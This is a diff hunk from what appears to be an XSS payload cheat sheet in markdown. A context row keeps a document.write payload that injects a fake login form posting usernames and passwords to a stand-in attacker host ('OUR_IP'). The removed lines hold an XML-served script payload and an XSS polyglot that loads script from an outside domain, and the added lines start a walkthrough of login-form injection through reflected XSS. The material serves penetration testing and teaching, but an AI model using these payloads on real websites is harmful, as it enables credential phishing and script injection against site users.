@@ -19,23 +19,8 @@
 | <p></p><pre class="language-javascript"><code class="lang-javascript">document.write('&#x3C;h3>Please login to continue&#x3C;/h3>&#x3C;form action=http://OUR_IP>&#x3C;input type="username" name="username" placeholder="Username">&#x3C;input type="password" name="password" placeholder="Password">&#x3C;input type="submit" name="submit" value="Login">&#x3C;/form>');
 </code></pre><p><br></p> | Login Form Injection                |
 
-#### Serve XSS 𝙥𝙖𝙮𝙡𝙤𝙖𝙙 from a XML file
-
-```
-<?xml version="1.0" encoding="UTF-8"?>
-<html xmlns:html="http://w3.org/1999/xhtml">
-<html:script>prompt(document.domain);</html:script>
-</html>
-```
-
-#### Sample XSS Polyglot
-
-```
-'"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//ChiragXSS.xSs.ht></scripT>
-```
-
-#### **How to perform basic Login Form Injection via Reflected XSS**&#x20;
-
+**How to perform basic Login Form Injection via Reflected XSS** \
+\
 Step 1: Test vulnerable form for the remove function by running script in console (Dev-Tools)
 
 ```
